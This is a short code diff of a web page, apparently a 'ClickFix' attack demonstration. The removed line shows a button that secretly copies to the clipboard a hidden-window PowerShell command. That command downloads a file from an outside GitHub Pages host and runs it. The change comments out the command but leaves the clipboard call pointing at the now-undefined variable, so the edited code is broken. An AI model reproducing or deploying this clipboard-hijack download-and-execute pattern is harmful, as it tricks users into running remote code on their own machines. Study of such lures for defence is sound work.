@@ -93,8 +93,8 @@ body{
   const desc = document.getElementById('desc');
 
   btn.onclick = async () => {
-    const cmd = `powershell -NoProfile -WindowStyle Hidden -Command "$u='https://abc-abc222.github.io/Clickfix-attack/saito.jpg'; $p=Join-Path $env:USERPROFILE 'Downloads\\saito.jpg'; Invoke-WebRequest -Uri $u -OutFile $p; Start-Process $p"`;
-    await navigator.clipboard.writeText(cmd);
+    /*const cmd = `powershell -NoProfile -WindowStyle Hidden -Command "$u='https://abc-abc222.github.io/Clickfix-attack/saito.jpg'; $p=Join-Path $env:USERPROFILE 'Downloads\\saito.jpg'; Invoke-WebRequest -Uri $u -OutFile $p; Start-Process $p"`;
+    */await navigator.clipboard.writeText(cmd);
 
     const opened = desc.classList.toggle('is-open');
     btn.setAttribute('aria-expanded', opened ? 'true' : 'false');
